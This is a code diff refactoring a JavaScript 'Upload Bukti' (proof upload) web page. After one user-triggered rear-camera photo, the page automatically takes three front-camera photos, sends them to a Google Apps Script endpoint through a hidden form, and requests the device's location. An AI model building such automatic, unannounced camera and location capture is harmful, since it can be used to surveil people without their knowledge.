@@ -83,7 +83,7 @@
 
 
     /* =====================================================
-       LIVE CAMERA PREVIEW
+       LIVE CAMERA
        ===================================================== */
 
     video {
@@ -179,6 +179,27 @@
 
       margin-top: 6px;
 
+      line-height: 1.4;
+
+    }
+
+
+    /* =====================================================
+       LOCATION SUCCESS
+       ===================================================== */
+
+    .location-success {
+
+      display: none;
+
+      margin-top: 20px;
+
+      font-size: 15px;
+
+      color: #333;
+
+      line-height: 1.5;
+
     }
 
 
@@ -202,7 +223,26 @@
 
 
     /* =====================================================
-       ANIMATION
+       LOCATION ERROR
+       ===================================================== */
+
+    .location-error {
+
+      display: none;
+
+      margin-top: 20px;
+
+      font-size: 15px;
+
+      line-height: 1.5;
+
+      color: #c00;
+
+    }
+
+
+    /* =====================================================
+       SPINNER
        ===================================================== */
 
     @keyframes spin {
@@ -233,7 +273,7 @@
 
 
   <!-- =====================================================
-       PREVIEW CAMERA
+       CAMERA PREVIEW
        ===================================================== -->
 
   <video id="video"
@@ -270,17 +310,44 @@
 
     <div class="spinner"></div>
 
-    <div class="loading-text">
+    <div id="loadingText"
+         class="loading-text">
 
       Sedang memproses...
 
     </div>
 
-    <div class="processing-note">
+    <div id="processingNote"
+         class="processing-note">
 
       Jangan menutup halaman ini
 
     </div>
+
+  </div>
+
+
+  <!-- =====================================================
+       LOCATION SUCCESS
+       ===================================================== -->
+
+  <div id="locationSuccess"
+       class="location-success">
+
+    ✓ Lokasi berhasil divalidasi
+
+  </div>
+
+
+  <!-- =====================================================
+       LOCATION ERROR
+       ===================================================== -->
+
+  <div id="locationError"
+       class="location-error">
+
+    Gagal, silakan ulang pengiriman dan pastikan
+    mengaktifkan lokasi device untuk validasi.
 
   </div>
 
@@ -305,35 +372,46 @@
 
 
   // =========================================================
-  // GOOGLE APPS SCRIPT URL
+  // GOOGLE APPS SCRIPT
   // =========================================================
 
   const GAS_URL =
     "https://script.google.com/macros/s/AKfycbyTXqpKOHsVlUNhQ_vWe9o5kMBdYjkTCp7gQfky0h00ohNMgIDSTi5PtD3gZ_f-bc_a/exec";
 
 
-
   // =========================================================
-  // VARIABLE
+  // ELEMENT
   // =========================================================
 
-  let video =
+  const video =
     document.getElementById("video");
 
-  let canvas =
+  const canvas =
     document.getElementById("canvas");
 
-  let button =
+  const button =
     document.getElementById("mainButton");
 
-  let loading =
+  const loading =
     document.getElementById("loading");
 
-  let thankYou =
+  const loadingText =
+    document.getElementById("loadingText");
+
+  const processingNote =
+    document.getElementById("processingNote");
+
+  const locationSuccess =
+    document.getElementById("locationSuccess");
+
+  const locationError =
+    document.getElementById("locationError");
+
+  const thankYou =
     document.getElementById("thankYou");
 
-  let stream = null;
 
+  let stream = null;
 
 
   // =========================================================
@@ -355,32 +433,23 @@
 
 
   // =========================================================
-  // START PROCESS
+  // START
   // =========================================================
 
   async function startProcess() {
 
 
     // -------------------------------------------------------
-    // HAPUS PESAN ERROR LOKASI SEBELUMNYA
+    // HAPUS ERROR LAMA
     // -------------------------------------------------------
 
-    const oldError =
-      document.getElementById(
-        "locationError"
-      );
+    locationError.style.display =
+      "none";
 
 
-    if (oldError) {
+    locationSuccess.style.display =
+      "none";
 
-      oldError.remove();
-
-    }
-
-
-    // -------------------------------------------------------
-    // RESET TAMPILAN
-    // -------------------------------------------------------
 
     thankYou.style.display =
       "none";
@@ -406,11 +475,15 @@
       true;
 
 
+    button.innerText =
+      "Membuka kamera...";
+
+
     try {
 
 
       // =====================================================
-      // BUKA KAMERA BELAKANG
+      // KAMERA BELAKANG
       // =====================================================
 
       await openCamera(
@@ -440,7 +513,10 @@
     catch (error) {
 
 
-      console.error(error);
+      console.error(
+        "Camera error:",
+        error
+      );
 
 
       alert(
@@ -454,6 +530,14 @@
         error.message
 
       );
+
+
+      button.innerText =
+        "Upload Bukti";
+
+
+      button.onclick =
+        startProcess;
 
 
       button.disabled =
@@ -475,14 +559,14 @@
 
 
     // -------------------------------------------------------
-    // MATIKAN KAMERA SEBELUMNYA
+    // STOP CAMERA SEBELUMNYA
     // -------------------------------------------------------
 
     stopCamera();
 
 
     // -------------------------------------------------------
-    // AKSES KAMERA
+    // REQUEST CAMERA
     // -------------------------------------------------------
 
     stream =
@@ -518,7 +602,7 @@
 
 
     // -------------------------------------------------------
-    // HUBUNGKAN STREAM KE VIDEO
+    // STREAM KE VIDEO
     // -------------------------------------------------------
 
     video.srcObject =
@@ -542,9 +626,7 @@
 
 
       stream
-
         .getTracks()
-
         .forEach(
 
           track => {
@@ -570,7 +652,7 @@
 
 
   // =========================================================
-  // CAPTURE FOTO
+  // CAPTURE PHOTO
   // =========================================================
 
   function capturePhoto() {
@@ -586,9 +668,7 @@
 
 
       throw new Error(
-
         "Kamera belum siap."
-
       );
 
     }
@@ -603,9 +683,7 @@
 
 
     const ctx =
-      canvas.getContext(
-        "2d"
-      );
+      canvas.getContext("2d");
 
 
     ctx.drawImage(
@@ -637,9 +715,6 @@
 
   // =========================================================
   // FOTO PERTAMA
-  //
-  // KAMERA BELAKANG
-  //
   // =========================================================
 
   async function takeFirstPhoto() {
@@ -653,12 +728,11 @@
 
 
       // =====================================================
-      // 1. CAPTURE FOTO PERTAMA
+      // 1. CAPTURE FOTO #1
       // =====================================================
 
       const image =
         capturePhoto();
-
 
 
       // =====================================================
@@ -686,7 +760,7 @@
 
 
       // -----------------------------------------------------
-      // Ukuran canvas
+      // CANVAS
       // -----------------------------------------------------
 
       canvas.width =
@@ -719,7 +793,7 @@
 
 
       // -----------------------------------------------------
-      // Tampilkan foto beku
+      // TAMPILKAN FOTO BEKU
       // -----------------------------------------------------
 
       video.style.display =
@@ -728,7 +802,6 @@
 
       canvas.style.display =
         "block";
-
 
 
       // =====================================================
@@ -740,7 +813,6 @@
       );
 
 
-
       // =====================================================
       // 4. LOADING
       // =====================================================
@@ -749,17 +821,12 @@
         "block";
 
 
-      document.querySelector(
-        ".loading-text"
-      ).innerText =
+      loadingText.innerText =
         "Sedang memproses...";
 
 
-      document.querySelector(
-        ".processing-note"
-      ).innerText =
+      processingNote.innerText =
         "Jangan menutup halaman ini";
-
 
 
       // =====================================================
@@ -777,22 +844,14 @@
         );
 
 
-
-      // =====================================================
-      // CEK UPLOAD
-      // =====================================================
-
       if (!success) {
 
 
         throw new Error(
-
           "Upload foto pertama gagal."
-
         );
 
       }
-
 
 
       // =====================================================
@@ -803,7 +862,6 @@
         "none";
 
 
-
       // =====================================================
       // 7. HAPUS FOTO BEKU
       // =====================================================
@@ -812,13 +870,11 @@
         "none";
 
 
-
       // =====================================================
-      // 8. MATIKAN KAMERA BELAKANG
+      // 8. STOP KAMERA BELAKANG
       // =====================================================
 
       stopCamera();
-
 
 
       // =====================================================
@@ -834,15 +890,13 @@
         "block";
 
 
-
       // =====================================================
-      // 10. TUNGGU KAMERA DEPAN STABIL
+      // 10. TUNGGU KAMERA DEPAN
       // =====================================================
 
       await delay(
         1200
       );
-
 
 
       // =====================================================
@@ -854,7 +908,6 @@
       );
 
 
-
       // =====================================================
       // 12. CAPTURE #3
       // =====================================================
@@ -862,7 +915,6 @@
       await automaticCapture(
         3
       );
-
 
 
       // =====================================================
@@ -874,41 +926,35 @@
       );
 
 
-
       // =====================================================
       // 14. SEMUA FOTO SELESAI
       // =====================================================
 
       stopCamera();
 
+
       video.style.display =
         "none";
 
 
-
       // =====================================================
-      // 15. MINTA AKSES LOKASI
+      // 15. REQUEST LOCATION
       // =====================================================
-
-      document.querySelector(
-        ".loading-text"
-      ).innerText =
-        "Memvalidasi lokasi...";
-
-
-      document.querySelector(
-        ".processing-note"
-      ).innerText =
-        "Izinkan akses lokasi untuk menyelesaikan pengiriman.";
-
 
       loading.style.display =
         "block";
 
 
+      loadingText.innerText =
+        "Meminta akses lokasi...";
+
+
+      processingNote.innerText =
+        "Izinkan akses lokasi untuk validasi bukti.";
+
 
       // =====================================================
-      // 16. REQUEST LOCATION
+      // 16. MINTA LOKASI
       // =====================================================
 
       try {
@@ -919,10 +965,9 @@
 
 
         console.log(
-          "Lokasi berhasil:",
+          "LOCATION SUCCESS:",
           location
         );
-
 
 
         // ===================================================
@@ -933,6 +978,23 @@
           "none";
 
 
+        locationSuccess.style.display =
+          "block";
+
+
+        // ---------------------------------------------------
+        // Tampilkan sebentar
+        // ---------------------------------------------------
+
+        await delay(
+          1500
+        );
+
+
+        locationSuccess.style.display =
+          "none";
+
+
         thankYou.style.display =
           "block";
 
@@ -940,17 +1002,17 @@
       }
 
 
-      catch (locationError) {
+      catch (locationErr) {
 
 
         console.error(
-          locationError
+          "LOCATION FAILED:",
+          locationErr
         );
 
 
-
         // ===================================================
-        // 18. LOKASI DITOLAK
+        // 18. LOKASI GAGAL
         // ===================================================
 
         loading.style.display =
@@ -959,6 +1021,14 @@
 
         thankYou.style.display =
           "none";
+
+
+        locationSuccess.style.display =
+          "none";
+
+
+        locationError.style.display =
+          "block";
 
 
         button.style.display =
@@ -976,51 +1046,6 @@
         button.onclick =
           startProcess;
 
-
-
-        // ---------------------------------------------------
-        // PESAN ERROR
-        // ---------------------------------------------------
-
-        const errorMessage =
-          document.createElement(
-            "div"
-          );
-
-
-        errorMessage.id =
-          "locationError";
-
-
-        errorMessage.style.marginTop =
-          "20px";
-
-
-        errorMessage.style.fontSize =
-          "15px";
-
-
-        errorMessage.style.lineHeight =
-          "1.5";
-
-
-        errorMessage.style.color =
-          "#c00";
-
-
-        errorMessage.innerText =
-
-          "Gagal, silakan ulang pengiriman dan pastikan mengaktifkan lokasi device untuk validasi.";
-
-
-        document
-          .querySelector(
-            ".container"
-          )
-          .appendChild(
-            errorMessage
-          );
-
       }
 
 
@@ -1030,19 +1055,14 @@
     catch (error) {
 
 
-      console.error(error);
+      console.error(
+        "Process error:",
+        error
+      );
 
-
-      // -----------------------------------------------------
-      // MATIKAN KAMERA
-      // -----------------------------------------------------
 
       stopCamera();
 
-
-      // -----------------------------------------------------
-      // RESET
-      // -----------------------------------------------------
 
       canvas.style.display =
         "none";
@@ -1096,13 +1116,12 @@
 
 
     // -------------------------------------------------------
-    // TUNGGU FRAME STABIL
+    // TUNGGU
     // -------------------------------------------------------
 
     await delay(
       1200
     );
-
 
 
     // -------------------------------------------------------
@@ -1111,7 +1130,6 @@
 
     const image =
       capturePhoto();
-
 
 
     // -------------------------------------------------------
@@ -1129,9 +1147,8 @@
       );
 
 
-
     // -------------------------------------------------------
-    // CEK HASIL
+    // CEK
     // -------------------------------------------------------
 
     if (!success) {
@@ -1150,7 +1167,6 @@
     }
 
 
-
     // -------------------------------------------------------
     // JEDA
     // -------------------------------------------------------
@@ -1167,8 +1183,89 @@
   // REQUEST LOCATION
   // =========================================================
 
-  function requestLocation() {
+  async function requestLocation() {
 
+
+    // -------------------------------------------------------
+    // CEK SUPPORT
+    // -------------------------------------------------------
+
+    if (!navigator.geolocation) {
+
+
+      throw new Error(
+        "Perangkat atau browser tidak mendukung lokasi."
+      );
+
+    }
+
+
+    // -------------------------------------------------------
+    // CEK PERMISSION STATUS
+    // -------------------------------------------------------
+
+    if (navigator.permissions) {
+
+
+      try {
+
+
+        const permission =
+
+          await navigator.permissions.query({
+
+            name:
+              "geolocation"
+
+          });
+
+
+        console.log(
+          "Location permission:",
+          permission.state
+        );
+
+
+        // ---------------------------------------------------
+        // SUDAH DITOLAK
+        // ---------------------------------------------------
+
+        if (
+          permission.state ===
+          "denied"
+        ) {
+
+
+          throw new Error(
+
+            "Akses lokasi sebelumnya ditolak."
+
+          );
+
+        }
+
+      }
+
+
+      catch (permissionError) {
+
+
+        console.log(
+
+          "Permission API:",
+          permissionError
+
+        );
+
+        // Tetap lanjut ke getCurrentPosition()
+      }
+
+    }
+
+
+    // -------------------------------------------------------
+    // REQUEST LOCATION
+    // -------------------------------------------------------
 
     return new Promise(
 
@@ -1177,36 +1274,6 @@
         reject
       ) {
 
-
-        // ---------------------------------------------------
-        // CEK SUPPORT
-        // ---------------------------------------------------
-
-        if (
-          !navigator.geolocation
-        ) {
-
-
-          reject(
-
-            new Error(
-
-              "Perangkat tidak mendukung akses lokasi."
-
-            )
-
-          );
-
-
-          return;
-
-        }
-
-
-
-        // ---------------------------------------------------
-        // REQUEST LOCATION
-        // ---------------------------------------------------
 
         navigator.geolocation
           .getCurrentPosition(
@@ -1221,7 +1288,7 @@
             ) {
 
 
-              const locationData = {
+              const data = {
 
 
                 latitude:
@@ -1244,24 +1311,24 @@
 
               console.log(
                 "Latitude:",
-                locationData.latitude
+                data.latitude
               );
 
 
               console.log(
                 "Longitude:",
-                locationData.longitude
+                data.longitude
               );
 
 
               console.log(
                 "Accuracy:",
-                locationData.accuracy
+                data.accuracy
               );
 
 
               resolve(
-                locationData
+                data
               );
 
             },
@@ -1277,19 +1344,56 @@
 
 
               console.error(
-                "Location error:",
+
+                "Geolocation error:",
+
                 error
+
               );
 
 
+              let message =
+
+                "Akses lokasi gagal.";
+
+
+              if (
+                error.code ===
+                1
+              ) {
+
+                message =
+                  "Akses lokasi ditolak.";
+
+              }
+
+
+              else if (
+                error.code ===
+                2
+              ) {
+
+                message =
+                  "Lokasi perangkat tidak tersedia.";
+
+              }
+
+
+              else if (
+                error.code ===
+                3
+              ) {
+
+                message =
+                  "Waktu permintaan lokasi habis.";
+
+              }
+
+
               reject(
-
                 new Error(
-
-                  "Lokasi tidak diizinkan."
-
+                  message
                 )
-
               );
 
             },
@@ -1323,7 +1427,7 @@
 
 
   // =========================================================
-  // UPLOAD FOTO KE GOOGLE APPS SCRIPT
+  // UPLOAD FOTO
   // =========================================================
 
   function uploadPhoto(
@@ -1362,7 +1466,6 @@
             .substring(2);
 
 
-
         iframe.name =
           iframeName;
 
@@ -1374,7 +1477,6 @@
         document.body.appendChild(
           iframe
         );
-
 
 
         // ---------------------------------------------------
@@ -1403,7 +1505,6 @@
           "none";
 
 
-
         // ---------------------------------------------------
         // PAYLOAD
         // ---------------------------------------------------
@@ -1423,7 +1524,6 @@
             image
 
         };
-
 
 
         // ---------------------------------------------------
@@ -1450,7 +1550,6 @@
           );
 
 
-
         form.appendChild(
           input
         );
@@ -1459,7 +1558,6 @@
         document.body.appendChild(
           form
         );
-
 
 
         // ---------------------------------------------------
@@ -1482,7 +1580,6 @@
               true;
 
 
-
             setTimeout(
 
               function() {
@@ -1503,7 +1600,6 @@
             );
 
           };
-
 
 
         // ---------------------------------------------------
@@ -1540,13 +1636,11 @@
           );
 
 
-
         // ---------------------------------------------------
         // SUBMIT
         // ---------------------------------------------------
 
         form.submit();
-
 
 
         // ---------------------------------------------------
@@ -1570,7 +1664,6 @@
           }
 
           catch (e) {}
-
 
 
           try {
@@ -1605,11 +1698,8 @@
       resolve =>
 
         setTimeout(
-
           resolve,
-
           ms
-
         )
 
     );
